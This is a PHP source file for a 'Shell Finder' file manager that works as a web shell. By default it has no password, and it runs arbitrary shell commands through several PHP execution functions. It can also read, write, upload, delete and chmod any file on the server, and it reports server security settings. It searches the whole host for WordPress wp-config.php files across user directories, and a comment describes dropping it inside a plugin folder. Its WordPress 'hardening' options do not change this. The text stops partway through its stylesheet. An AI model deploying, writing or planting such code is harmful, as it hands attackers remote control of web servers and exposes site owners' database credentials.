<?php
/*
 * ╔═══════════════════════════════════════════════════════╗
 * ║          SHELL FINDER - PHP File Manager              ║
 * ║           Single-File Self-Contained                  ║
 * ╚═══════════════════════════════════════════════════════╝
 */

session_start();
error_reporting(0);

// ── Configuration ──────────────────────────────────────
define('APP_NAME', 'Shell Finder');
define('APP_VERSION', '1.0');
define('PASSWORD', '');  // Set a password or leave empty for no auth
define('START_DIR', __DIR__);
define('MAX_UPLOAD', '1024M');
@ini_set('upload_max_filesize', MAX_UPLOAD);
@ini_set('post_max_size', MAX_UPLOAD);
@ini_set('memory_limit', '512M');
@ini_set('max_execution_time', 0);

// ── Authentication ─────────────────────────────────────
if (PASSWORD !== '') {
    if (!isset($_SESSION['sf_auth']) || $_SESSION['sf_auth'] !== true) {
        if (isset($_POST['sf_password'])) {
            if ($_POST['sf_password'] === PASSWORD) {
                $_SESSION['sf_auth'] = true;
            } else {
                $auth_error = 'Invalid password';
            }
        }
        if (!isset($_SESSION['sf_auth']) || $_SESSION['sf_auth'] !== true) {
            render_login($auth_error ?? null);
            exit;
        }
    }
}

// ── Path Resolution ────────────────────────────────────
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : START_DIR;
if ($current_dir === false) $current_dir = START_DIR;

// ── API Handler ────────────────────────────────────────
if (isset($_GET['action'])) {
    header('Content-Type: application/json');
    $action = $_GET['action'];
    $response = ['success' => false, 'message' => 'Unknown action'];

    switch ($action) {
        // List directory
        case 'list':
            $dir = isset($_GET['dir']) ? $_GET['dir'] : START_DIR;
            $dir = realpath($dir);
            if ($dir === false || !is_dir($dir)) {
                $response = ['success' => false, 'message' => 'Invalid directory'];
                break;
            }
            $items = [];
            $entries = @glob($dir . "/{,.}*", GLOB_BRACE); if ($entries !== false) { $entries = array_map("basename", $entries); }
            if ($entries === false) {
                $response = ['success' => false, 'message' => 'Cannot read directory'];
                break;
            }
            foreach ($entries as $entry) {
                if ($entry === '.') continue;
                $full = $dir . DIRECTORY_SEPARATOR . $entry;
                $stat = @stat($full);
                $items[] = [
                    'name' => $entry,
                    'path' => $full,
                    'is_dir' => is_dir($full),
                    'is_link' => is_link($full),
                    'size' => is_file($full) ? filesize($full) : 0,
                    'perms' => substr(sprintf('%o', fileperms($full)), -4),
                    'owner' => function_exists('posix_getpwuid') ? (posix_getpwuid(fileowner($full))['name'] ?? fileowner($full)) : fileowner($full),
                    'group' => function_exists('posix_getgrgid') ? (posix_getgrgid(filegroup($full))['name'] ?? filegroup($full)) : filegroup($full),
                    'mtime' => date('Y-m-d H:i:s', filemtime($full)),
                    'readable' => is_readable($full),
                    'writable' => is_writable($full),
                ];
            }
            $response = ['success' => true, 'items' => $items, 'current' => $dir];
            break;

        // Read file
        case 'read':
            $file = $_GET['file'] ?? '';
            if (!is_file($file) || !is_readable($file)) {
                $response = ['success' => false, 'message' => 'Cannot read file'];
                break;
            }
            $size = filesize($file);
            if ($size > 10 * 1024 * 1024) {
                $response = ['success' => false, 'message' => 'File too large to edit (>10MB)'];
                break;
            }
            $content = file_get_contents($file);
            $response = ['success' => true, 'content' => $content, 'path' => $file, 'size' => $size];
            break;

        // Save file
        case 'save':
            $data = json_decode(file_get_contents('php://input'), true);
            $file = $data['file'] ?? '';
            $content = $data['content'] ?? '';
            if (empty($file)) {
                $response = ['success' => false, 'message' => 'No file specified'];
                break;
            }
            if (@file_put_contents($file, $content) !== false) {
                $response = ['success' => true, 'message' => 'File saved'];
            } else {
                $response = ['success' => false, 'message' => 'Failed to save file'];
            }
            break;

        // Create file or folder
        case 'create':
            $data = json_decode(file_get_contents('php://input'), true);
            $dir = $data['dir'] ?? '';
            $name = $data['name'] ?? '';
            $type = $data['type'] ?? 'file';
            $path = rtrim($dir, '/') . '/' . $name;
            if (file_exists($path)) {
                $response = ['success' => false, 'message' => 'Already exists'];
                break;
            }
            if ($type === 'folder') {
                $response = @mkdir($path, 0755, true)
                    ? ['success' => true, 'message' => 'Folder created']
                    : ['success' => false, 'message' => 'Failed to create folder'];
            } else {
                $response = @file_put_contents($path, '') !== false
                    ? ['success' => true, 'message' => 'File created']
                    : ['success' => false, 'message' => 'Failed to create file'];
            }
            break;

        // Delete
        case 'delete':
            $data = json_decode(file_get_contents('php://input'), true);
            $target = $data['path'] ?? '';
            if (empty($target) || !file_exists($target)) {
                $response = ['success' => false, 'message' => 'Path not found'];
                break;
            }
            if (is_dir($target)) {
                $response = delete_recursive($target)
                    ? ['success' => true, 'message' => 'Deleted']
                    : ['success' => false, 'message' => 'Failed to delete'];
            } else {
                $response = @unlink($target)
                    ? ['success' => true, 'message' => 'Deleted']
                    : ['success' => false, 'message' => 'Failed to delete'];
            }
            break;

        // Rename / Move
        case 'rename':
            $data = json_decode(file_get_contents('php://input'), true);
            $old = $data['old'] ?? '';
            $new = $data['new'] ?? '';
            if (empty($old) || empty($new)) {
                $response = ['success' => false, 'message' => 'Invalid paths'];
                break;
            }
            $response = @rename($old, $new)
                ? ['success' => true, 'message' => 'Renamed']
                : ['success' => false, 'message' => 'Failed to rename'];
            break;

        // Copy
        case 'copy':
            $data = json_decode(file_get_contents('php://input'), true);
            $src = $data['src'] ?? '';
            $dst = $data['dst'] ?? '';
            if (empty($src) || empty($dst)) {
                $response = ['success' => false, 'message' => 'Invalid paths'];
                break;
            }
            if (is_dir($src)) {
                $response = copy_recursive($src, $dst)
                    ? ['success' => true, 'message' => 'Copied']
                    : ['success' => false, 'message' => 'Failed to copy'];
            } else {
                $response = @copy($src, $dst)
                    ? ['success' => true, 'message' => 'Copied']
                    : ['success' => false, 'message' => 'Failed to copy'];
            }
            break;

        // Chmod
        case 'chmod':
            $data = json_decode(file_get_contents('php://input'), true);
            $path = $data['path'] ?? '';
            $mode = $data['mode'] ?? '';
            if (empty($path) || empty($mode)) {
                $response = ['success' => false, 'message' => 'Invalid parameters'];
                break;
            }
            $response = @chmod($path, octdec($mode))
                ? ['success' => true, 'message' => 'Permissions changed']
                : ['success' => false, 'message' => 'Failed to change permissions'];
            break;

        // Upload
        case 'upload':
            $dir = $_POST['dir'] ?? START_DIR;
            if (!is_dir($dir) || !is_writable($dir)) {
                $response = ['success' => false, 'message' => 'Directory not writable'];
                break;
            }
            $uploaded = 0;
            if (isset($_FILES['files'])) {
                foreach ($_FILES['files']['name'] as $i => $name) {
                    if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {
                        $dest = rtrim($dir, '/') . '/' . basename($name);
                        if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $dest)) {
                            $uploaded++;
                        }
                    }
                }
            }
            $response = ['success' => true, 'message' => "$uploaded file(s) uploaded"];
            break;

        // Download
        case 'download':
            $file = $_GET['file'] ?? '';
            if (!is_file($file) || !is_readable($file)) {
                http_response_code(404);
                die('File not found');
            }
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;

        // Execute command
        case 'exec':
            $data = json_decode(file_get_contents('php://input'), true);
            $cmd = $data['cmd'] ?? '';
            $dir = $data['dir'] ?? START_DIR;
            if (empty($cmd)) {
                $response = ['success' => false, 'message' => 'No command'];
                break;
            }
            $full_cmd = "cd " . escapeshellarg($dir) . " && " . $cmd . " 2>&1";
            $output = '';
            if (function_exists('shell_exec')) {
                $output = shell_exec($full_cmd);
            } elseif (function_exists('exec')) {
                exec($full_cmd, $out, $ret);
                $output = implode("\n", $out);
            } elseif (function_exists('system')) {
                ob_start();
                system($full_cmd);
                $output = ob_get_clean();
            } elseif (function_exists('passthru')) {
                ob_start();
                passthru($full_cmd);
                $output = ob_get_clean();
            } elseif (function_exists('proc_open')) {
                $proc = proc_open($full_cmd, [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
                if (is_resource($proc)) {
                    $output = stream_get_contents($pipes[1]);
                    $output .= stream_get_contents($pipes[2]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($proc);
                }
            } else {
                $output = 'No execution function available';
            }
            $response = ['success' => true, 'output' => $output];
            break;

        // Search
        case 'search':
            $dir = $_GET['dir'] ?? START_DIR;
            $query = $_GET['q'] ?? '';
            if (empty($query)) {
                $response = ['success' => false, 'message' => 'No search query'];
                break;
            }
            $results = [];
            search_files($dir, $query, $results, 0, 3);
            $response = ['success' => true, 'results' => $results];
            break;

        // Info
        case 'info':
            $response = [
                'success' => true,
                'php_version' => PHP_VERSION,
                'os' => PHP_OS,
                'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'CLI',
                'user' => get_current_user(),
                'uid' => function_exists('posix_getuid') ? posix_getuid() : 'N/A',
                'gid' => function_exists('posix_getgid') ? posix_getgid() : 'N/A',
                'disable_functions' => ini_get('disable_functions'),
                'safe_mode' => ini_get('safe_mode') ? 'ON' : 'OFF',
                'open_basedir' => ini_get('open_basedir') ?: 'None',
                'uname' => php_uname(),
                'doc_root' => $_SERVER['DOCUMENT_ROOT'] ?? __DIR__,
                'script' => __FILE__,
                'free_space' => format_size(@disk_free_space('/')),
                'total_space' => format_size(@disk_total_space('/')),
            ];
            break;

        // Compress
        case 'compress':
            $data = json_decode(file_get_contents('php://input'), true);
            $path = $data['path'] ?? '';
            $type = $data['type'] ?? 'zip';
            if (empty($path) || !file_exists($path)) {
                $response = ['success' => false, 'message' => 'Path not found'];
                break;
            }
            $archive = $path . ($type === 'tar.gz' ? '.tar.gz' : '.zip');
            if ($type === 'tar.gz') {
                $cmd = "tar -czf " . escapeshellarg($archive) . " -C " . escapeshellarg(dirname($path)) . " " . escapeshellarg(basename($path)) . " 2>&1";
                $out = shell_exec($cmd);
                $response = file_exists($archive)
                    ? ['success' => true, 'message' => 'Compressed to ' . basename($archive)]
                    : ['success' => false, 'message' => 'Compression failed: ' . $out];
            } else {
                if (class_exists('ZipArchive')) {
                    $zip = new ZipArchive();
                    if ($zip->open($archive, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                        if (is_dir($path)) {
                            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::LEAVES_ONLY);
                            foreach ($files as $file) {
                                if (!$file->isDir()) {
                                    $filePath = $file->getRealPath();
                                    $relativePath = substr($filePath, strlen(dirname($path)) + 1);
                                    $zip->addFile($filePath, $relativePath);
                                }
                            }
                        } else {
                            $zip->addFile($path, basename($path));
                        }
                        $zip->close();
                        $response = ['success' => true, 'message' => 'Compressed to ' . basename($archive)];
                    } else {
                        $response = ['success' => false, 'message' => 'Failed to create ZIP'];
                    }
                } else {
                    $cmd = "zip -r " . escapeshellarg($archive) . " " . escapeshellarg($path) . " 2>&1";
                    shell_exec($cmd);
                    $response = file_exists($archive)
                        ? ['success' => true, 'message' => 'Compressed']
                        : ['success' => false, 'message' => 'ZIP not available'];
                }
            }
            break;

        // Extract
        case 'extract':
            $data = json_decode(file_get_contents('php://input'), true);
            $file = $data['file'] ?? '';
            $dest = $data['dest'] ?? dirname($file);
            if (empty($file) || !is_file($file)) {
                $response = ['success' => false, 'message' => 'File not found'];
                break;
            }
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            if ($ext === 'zip') {
                if (class_exists('ZipArchive')) {
                    $zip = new ZipArchive();
                    if ($zip->open($file) === true) {
                        $zip->extractTo($dest);
                        $zip->close();
                        $response = ['success' => true, 'message' => 'Extracted'];
                    } else {
                        $response = ['success' => false, 'message' => 'Failed to extract'];
                    }
                } else {
                    $out = shell_exec("unzip -o " . escapeshellarg($file) . " -d " . escapeshellarg($dest) . " 2>&1");
                    $response = ['success' => true, 'message' => 'Extracted'];
                }
            } elseif ($ext === 'gz' || $ext === 'tgz') {
                $out = shell_exec("tar -xzf " . escapeshellarg($file) . " -C " . escapeshellarg($dest) . " 2>&1");
                $response = ['success' => true, 'message' => 'Extracted'];
            } else {
                $response = ['success' => false, 'message' => 'Unsupported archive format'];
            }
            break;

        // WordPress: Auto-detect wp-config.php from script location
        case 'wp_auto':
            $found = wp_auto_find();
            if ($found === null) {
                $response = ['success' => true, 'found' => false, 'configs' => []];
                break;
            }
            // Normalize to array
            $configs = is_array($found) ? $found : [$found];
            $all_configs = [];
            foreach ($configs as $cfg_path) {
                $content = @file_get_contents($cfg_path);
                $all_configs[] = [
                    'file' => $cfg_path,
                    'writable' => is_writable($cfg_path),
                    'wp_root' => dirname($cfg_path),
                    'constants' => [
                        'DISALLOW_FILE_EDIT' => wp_detect_constant($content, 'DISALLOW_FILE_EDIT'),
                        'DISALLOW_FILE_MODS' => wp_detect_constant($content, 'DISALLOW_FILE_MODS'),
                        'FORCE_SSL_ADMIN' => wp_detect_constant($content, 'FORCE_SSL_ADMIN'),
                        'WP_AUTO_UPDATE_CORE' => wp_detect_constant($content, 'WP_AUTO_UPDATE_CORE'),
                        'AUTOMATIC_UPDATER_DISABLED' => wp_detect_constant($content, 'AUTOMATIC_UPDATER_DISABLED'),
                        'WP_DEBUG' => wp_detect_constant($content, 'WP_DEBUG'),
                        'WP_DEBUG_LOG' => wp_detect_constant($content, 'WP_DEBUG_LOG'),
                        'WP_DEBUG_DISPLAY' => wp_detect_constant($content, 'WP_DEBUG_DISPLAY'),
                    ],
                ];
            }
            // For backward compat, also set top-level fields from first config
            $first = $all_configs[0];
            $response = [
                'success' => true,
                'found' => true,
                'file' => $first['file'],
                'writable' => $first['writable'],
                'constants' => $first['constants'],
                'wp_root' => $first['wp_root'],
                'configs' => $all_configs,
                'count' => count($all_configs),
            ];
            break;

        // WordPress: ONE-URL Lock All — just visit ?action=wp_lockall
        case 'wp_lockall':
            $found = wp_auto_find();
            if ($found === null) {
                $response = ['success' => false, 'message' => 'No wp-config.php found'];
                break;
            }
            $configs = is_array($found) ? $found : [$found];
            $results = [];
            $patches = ['DISALLOW_FILE_EDIT' => true, 'DISALLOW_FILE_MODS' => true];
            foreach ($configs as $cfg) {
                $r = ['file' => $cfg, 'status' => 'skipped'];
                if (!is_writable($cfg)) {
                    $r['status'] = 'read-only';
                    $results[] = $r;
                    continue;
                }
                $content = file_get_contents($cfg);
                $backup = $cfg . '.bak.' . date('YmdHis');
                @copy($cfg, $backup);
                foreach ($patches as $name => $value) {
                    $define_line = "define('" . $name . "', true);";
                    $pattern = "/^\s*define\s*\(\s*['\"]" . preg_quote($name) . "['\"]\s*,.*?\)\s*;/m";
                    if (preg_match($pattern, $content)) {
                        $content = preg_replace($pattern, $define_line, $content);
                    } else {
                        $marker = "/* That's all, stop editing!";
                        $alt_marker = "/** Absolute path to the WordPress directory";
                        $comment = "\n/** Shell Finder WP Hardening - " . $name . " */\n" . $define_line . "\n";
                        if (strpos($content, $marker) !== false) {
                            $content = str_replace($marker, $comment . $marker, $content);
                        } elseif (strpos($content, $alt_marker) !== false) {
                            $content = str_replace($alt_marker, $comment . $alt_marker, $content);
                        } else {
                            $content .= "\n" . $comment;
                        }
                    }
                }
                if (@file_put_contents($cfg, $content) !== false) {
                    $r['status'] = 'locked';
                    $r['backup'] = basename($backup);
                } else {
                    $r['status'] = 'failed';
                }
                $results[] = $r;
            }
            $locked = count(array_filter($results, fn($r) => $r['status'] === 'locked'));
            $failed = count(array_filter($results, fn($r) => $r['status'] === 'failed'));
            $readonly = count(array_filter($results, fn($r) => $r['status'] === 'read-only'));
            $response = [
                'success' => true,
                'message' => "Locked: {$locked}, Failed: {$failed}, Read-only: {$readonly} / Total: " . count($configs),
                'results' => $results,
            ];
            break;

        // WordPress: Lock single config via GET — ?action=wp_lock&file=/path/to/wp-config.php
        case 'wp_lock':
            $file = $_GET['file'] ?? '';
            if (empty($file) || !is_file($file)) {
                // If no file specified, try auto-detect first config
                $found = wp_auto_find();
                if ($found === null) {
                    $response = ['success' => false, 'message' => 'No wp-config.php found'];
                    break;
                }
                $file = is_array($found) ? $found[0] : $found;
            }
            if (!is_writable($file)) {
                $response = ['success' => false, 'message' => 'File is read-only: ' . $file];
                break;
            }
            $content = file_get_contents($file);
            $backup = $file . '.bak.' . date('YmdHis');
            @copy($file, $backup);
            foreach (['DISALLOW_FILE_EDIT', 'DISALLOW_FILE_MODS'] as $name) {
                $define_line = "define('" . $name . "', true);";
                $pattern = "/^\s*define\s*\(\s*['\"]" . preg_quote($name) . "['\"]\s*,.*?\)\s*;/m";
                if (preg_match($pattern, $content)) {
                    $content = preg_replace($pattern, $define_line, $content);
                } else {
                    $marker = "/* That's all, stop editing!";
                    $alt_marker = "/** Absolute path to the WordPress directory";
                    $comment = "\n/** Shell Finder WP Hardening - " . $name . " */\n" . $define_line . "\n";
                    if (strpos($content, $marker) !== false) {
                        $content = str_replace($marker, $comment . $marker, $content);
                    } elseif (strpos($content, $alt_marker) !== false) {
                        $content = str_replace($alt_marker, $comment . $alt_marker, $content);
                    } else {
                        $content .= "\n" . $comment;
                    }
                }
            }
            if (@file_put_contents($file, $content) !== false) {
                $response = ['success' => true, 'message' => 'LOCKED: ' . $file, 'backup' => basename($backup)];
            } else {
                $response = ['success' => false, 'message' => 'Failed to write: ' . $file];
            }
            break;

        // WordPress: Scan for wp-config.php
        case 'wp_scan':
            $scan_dir = $_GET['dir'] ?? '/';
            $wpConfigs = [];
            wp_find_configs($scan_dir, $wpConfigs, 0, 5);
            $response = ['success' => true, 'configs' => $wpConfigs];
            break;

        // WordPress: Read wp-config.php and detect current constants
        case 'wp_read':
            $file = $_GET['file'] ?? '';
            if (!is_file($file) || !is_readable($file)) {
                $response = ['success' => false, 'message' => 'Cannot read wp-config.php'];
                break;
            }
            $content = file_get_contents($file);
            $constants = [
                'DISALLOW_FILE_EDIT' => wp_detect_constant($content, 'DISALLOW_FILE_EDIT'),
                'DISALLOW_FILE_MODS' => wp_detect_constant($content, 'DISALLOW_FILE_MODS'),
                'WP_AUTO_UPDATE_CORE' => wp_detect_constant($content, 'WP_AUTO_UPDATE_CORE'),
                'FORCE_SSL_ADMIN' => wp_detect_constant($content, 'FORCE_SSL_ADMIN'),
                'AUTOMATIC_UPDATER_DISABLED' => wp_detect_constant($content, 'AUTOMATIC_UPDATER_DISABLED'),
                'WP_DEBUG' => wp_detect_constant($content, 'WP_DEBUG'),
                'WP_DEBUG_LOG' => wp_detect_constant($content, 'WP_DEBUG_LOG'),
                'WP_DEBUG_DISPLAY' => wp_detect_constant($content, 'WP_DEBUG_DISPLAY'),
            ];
            $response = ['success' => true, 'file' => $file, 'constants' => $constants, 'writable' => is_writable($file)];
            break;

        // WordPress: Patch wp-config.php with selected constants
        case 'wp_patch':
            $data = json_decode(file_get_contents('php://input'), true);
            $file = $data['file'] ?? '';
            $patches = $data['patches'] ?? [];
            if (!is_file($file)) {
                $response = ['success' => false, 'message' => 'File not found'];
                break;
            }
            if (!is_writable($file)) {
                $response = ['success' => false, 'message' => 'wp-config.php is not writable'];
                break;
            }
            $content = file_get_contents($file);
            $backup = $file . '.bak.' . date('YmdHis');
            @copy($file, $backup);
            $injected = [];
            foreach ($patches as $name => $value) {
                $val_str = ($value === true || $value === 'true') ? 'true' : (($value === false || $value === 'false') ? 'false' : "'" . addslashes($value) . "'");
                $define_line = "define('" . $name . "', " . $val_str . ");";
                $pattern = "/^\s*define\s*\(\s*['\"]" . preg_quote($name) . "['\"]\s*,.*?\)\s*;/m";
                if (preg_match($pattern, $content)) {
                    $content = preg_replace($pattern, $define_line, $content);
                } else {
                    $marker = "/* That's all, stop editing!";
                    $alt_marker = "/** Absolute path to the WordPress directory";
                    $comment = "\n/** Shell Finder WP Hardening - " . $name . " */\n" . $define_line . "\n";
                    if (strpos($content, $marker) !== false) {
                        $content = str_replace($marker, $comment . $marker, $content);
                    } elseif (strpos($content, $alt_marker) !== false) {
                        $content = str_replace($alt_marker, $comment . $alt_marker, $content);
                    } else {
                        $content .= "\n" . $comment;
                    }
                }
                $injected[] = $name;
            }
            if (@file_put_contents($file, $content) !== false) {
                $response = ['success' => true, 'message' => 'Patched: ' . implode(', ', $injected), 'backup' => basename($backup)];
            } else {
                $response = ['success' => false, 'message' => 'Failed to write wp-config.php'];
            }
            break;
    }

    echo json_encode($response);
    exit;
}

// ── Helper Functions ───────────────────────────────────
function delete_recursive($dir) {
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? delete_recursive($path) : unlink($path);
    }
    return rmdir($dir);
}

function copy_recursive($src, $dst) {
    if (is_file($src)) return copy($src, $dst);
    @mkdir($dst, 0755, true);
    foreach (scandir($src) as $item) {
        if ($item === '.' || $item === '..') continue;
        copy_recursive($src . '/' . $item, $dst . '/' . $item);
    }
    return true;
}

function wp_auto_find() {
    $found = [];

    // ── Method 1: Walk UP from script directory ──────────
    // Works when uploaded inside /wp-content/plugins/xxx/
    $dir = __DIR__;
    for ($i = 0; $i < 10; $i++) {
        $check = $dir . '/wp-config.php';
        if (is_file($check) && wp_verify_config($check)) {
            $found[$check] = true;
            break;
        }
        $parent = dirname($dir);
        if ($parent === $dir) break;
        $dir = $parent;
    }

    // ── Method 2: DOCUMENT_ROOT ──────────────────────────
    // Works on Apache/Nginx when accessed via web
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
        if ($docroot) {
            $check = $docroot . '/wp-config.php';
            if (is_file($check) && wp_verify_config($check)) $found[$check] = true;
            // One level above docroot (some setups)
            $check = dirname($docroot) . '/wp-config.php';
            if (is_file($check) && wp_verify_config($check)) $found[$check] = true;
        }
    }

    // ── Method 3: Glob common hosting paths ──────────────
    // Covers cPanel, Plesk, DirectAdmin, custom setups, shared hosting
    $globs = [
        // Standard Linux
        '/var/www/html/wp-config.php',
        '/var/www/wp-config.php',
        '/var/www/*/wp-config.php',
        '/var/www/html/*/wp-config.php',
        '/var/www/vhosts/*/wp-config.php',
        '/var/www/vhosts/*/httpdocs/wp-config.php',
        '/var/www/vhosts/*/htdocs/wp-config.php',
        '/var/www/clients/*/web*/wp-config.php',
        // cPanel style
        '/home/*/public_html/wp-config.php',
        '/home/*/public_html/*/wp-config.php',
        '/home/*/www/wp-config.php',
        '/home/*/www/*/wp-config.php',
        '/home/*/htdocs/wp-config.php',
        '/home/*/domains/*/public_html/wp-config.php',
        '/home/*/web/wp-config.php',
        '/home/*/sites/*/wp-config.php',
        // Plesk
        '/var/www/vhosts/*/httpdocs/wp-config.php',
        // DirectAdmin
        '/home/*/domains/*/public_html/wp-config.php',
        // srv based
        '/srv/www/wp-config.php',
        '/srv/www/*/wp-config.php',
        '/srv/www/htdocs/wp-config.php',
        '/srv/www/htdocs/*/wp-config.php',
        // XAMPP / WAMP / bitnami
        '/opt/lampp/htdocs/wp-config.php',
        '/opt/lampp/htdocs/*/wp-config.php',
        '/opt/bitnami/wordpress/wp-config.php',
        '/opt/bitnami/apps/wordpress/htdocs/wp-config.php',
        // usr share
        '/usr/share/wordpress/wp-config.php',
        '/usr/share/nginx/html/wp-config.php',
        '/usr/share/nginx/html/*/wp-config.php',
        '/usr/share/nginx/www/wp-config.php',
        // tmp / random common
        '/tmp/wp-config.php',
    ];
    foreach ($globs as $pattern) {
        if (strpos($pattern, '*') !== false) {
            $matches = @glob($pattern);
            if ($matches) {
                foreach ($matches as $m) {
                    if (is_file($m) && wp_verify_config($m)) $found[$m] = true;
                }
            }
        } else {
            if (is_file($pattern) && wp_verify_config($pattern)) $found[$pattern] = true;
        }
    }

    // ── Method 4: Apache/Nginx vhost config detection ────
    // Try to find docroot from running web server config
    if (empty($found)) {
        $vhost_dirs = [];
        // Try reading apache sites
        foreach (['/etc/apache2/sites-enabled', '/etc/httpd/conf.d', '/etc/nginx/sites-enabled', '/etc/nginx/conf.d'] as $confdir) {
            if (is_dir($confdir)) {
                $files = @glob($confdir . '/*');
                if ($files) {
                    foreach ($files as $f) {
                        $content = @file_get_contents($f);
                        if ($content && preg_match_all('/(?:DocumentRoot|root)\s+["\']?([^\s"\']+)/i', $content, $m)) {
                            foreach ($m[1] as $vdir) {
                                $vdir = rtrim($vdir, ';');
                                $check = $vdir . '/wp-config.php';
                                if (is_file($check) && wp_verify_config($check)) $found[$check] = true;
                            }
                        }
                    }
                }
            }
        }
    }

    // ── Method 5: `find` command as last resort ──────────
    // Aggressive: search the whole server for wp-config.php
    if (empty($found)) {
        $search_dirs = ['/var/www', '/home', '/srv/www', '/opt'];
        foreach ($search_dirs as $sdir) {
            if (!is_dir($sdir)) continue;
            $cmd = "find " . escapeshellarg($sdir) . " -maxdepth 5 -name 'wp-config.php' -type f 2>/dev/null | head -20";
            $output = @shell_exec($cmd);
            if ($output) {
                $lines = array_filter(explode("\n", trim($output)));
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (is_file($line) && wp_verify_config($line)) $found[$line] = true;
                }
            }
            if (!empty($found)) break;
        }
    }

    $results = array_keys($found);
    if (empty($results)) return null;
    if (count($results) === 1) return $results[0];
    // Multiple found — return all, let frontend handle
    return $results;
}

// Verify a file is actually a real wp-config.php (not a random file named the same)
function wp_verify_config($path) {
    $content = @file_get_contents($path, false, null, 0, 2048); // read first 2KB only
    if (!$content) return false;
    // Must contain DB_NAME or DB_HOST or table_prefix — hallmarks of wp-config.php
    return (strpos($content, 'DB_NAME') !== false || strpos($content, 'DB_HOST') !== false || strpos($content, 'table_prefix') !== false);
}

function wp_find_configs($dir, &$results, $depth = 0, $maxDepth = 5) {
    if ($depth > $maxDepth || count($results) > 50) return;
    $entries = @glob($dir . "/{,.}*", GLOB_BRACE); if ($entries !== false) { $entries = array_map("basename", $entries); }
    if (!$entries) return;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $path = rtrim($dir, '/') . '/' . $entry;
        if ($entry === 'wp-config.php' && is_file($path)) {
            $results[] = [
                'path' => $path,
                'dir' => dirname($path),
                'writable' => is_writable($path),
                'size' => filesize($path),
                'mtime' => date('Y-m-d H:i:s', filemtime($path)),
            ];
        }
        if (is_dir($path) && !is_link($path) && $entry !== 'node_modules' && $entry !== '.git') {
            wp_find_configs($path, $results, $depth + 1, $maxDepth);
        }
    }
}

function wp_detect_constant($content, $name) {
    $pattern = "/^\s*define\s*\(\s*['\"]" . preg_quote($name) . "['\"]\s*,\s*(.+?)\s*\)\s*;/m";
    if (preg_match($pattern, $content, $m)) {
        $val = trim($m[1]);
        if (strtolower($val) === 'true') return ['exists' => true, 'value' => true];
        if (strtolower($val) === 'false') return ['exists' => true, 'value' => false];
        return ['exists' => true, 'value' => trim($val, "'\"")];
    }
    return ['exists' => false, 'value' => null];
}

function search_files($dir, $query, &$results, $depth = 0, $maxDepth = 3) {
    if ($depth > $maxDepth || count($results) > 100) return;
    $entries = @glob($dir . "/{,.}*", GLOB_BRACE); if ($entries !== false) { $entries = array_map("basename", $entries); }
    if (!$entries) return;
    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;
        $path = $dir . '/' . $entry;
        if (stripos($entry, $query) !== false) {
            $results[] = ['name' => $entry, 'path' => $path, 'is_dir' => is_dir($path)];
        }
        if (is_dir($path) && !is_link($path)) {
            search_files($path, $query, $results, $depth + 1, $maxDepth);
        }
    }
}

function format_size($bytes) {
    if ($bytes <= 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

function render_login($error = null) {
    ?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title><?=APP_NAME?> - Login</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;background-image:radial-gradient(ellipse at 50% 0%,rgba(120,80,255,.12) 0%,transparent 60%)}
    .login{background:rgba(20,20,35,.85);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:48px;width:380px;text-align:center}
    .login h1{font-size:24px;margin-bottom:8px;background:linear-gradient(135deg,#a78bfa,#60a5fa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
    .login p{color:#888;margin-bottom:28px;font-size:13px}
    .login input{width:100%;padding:12px 16px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:10px;color:#fff;font-size:14px;outline:none;transition:.2s}
    .login input:focus{border-color:#a78bfa;box-shadow:0 0 0 3px rgba(167,139,250,.15)}
    .login button{width:100%;padding:12px;margin-top:16px;background:linear-gradient(135deg,#7c3aed,#3b82f6);border:none;border-radius:10px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:.2s}
    .login button:hover{transform:translateY(-1px);box-shadow:0 4px 20px rgba(124,58,237,.4)}
    .error{color:#f87171;font-size:13px;margin-top:12px}</style></head>
    <body><form class="login" method="POST"><h1>🔐 <?=APP_NAME?></h1><p>Enter password to continue</p>
    <input type="password" name="sf_password" placeholder="Password" autofocus>
    <button type="submit">Authenticate</button>
    <?php if ($error): ?><div class="error"><?=$error?></div><?php endif; ?>
    </form></body></html><?php
}

// ── Render UI ──────────────────────────────────────────
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?=APP_NAME?> v<?=APP_VERSION?></title>
<style>
/* ── Reset & Base ─────────────────────────── */
*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
:root {
    --bg-primary: #07070d;
    --bg-secondary: #0d0d18;
    --bg-card: rgba(14,14,28,.75);
    --bg-hover: rgba(255,255,255,.04);
    --border: rgba(255,255,255,.06);
    --border-active: rgba(167,139,250,.4);
    --text-primary: #e8e8f0;
    --text-secondary: #8888a0;
    --text-muted: #555570;
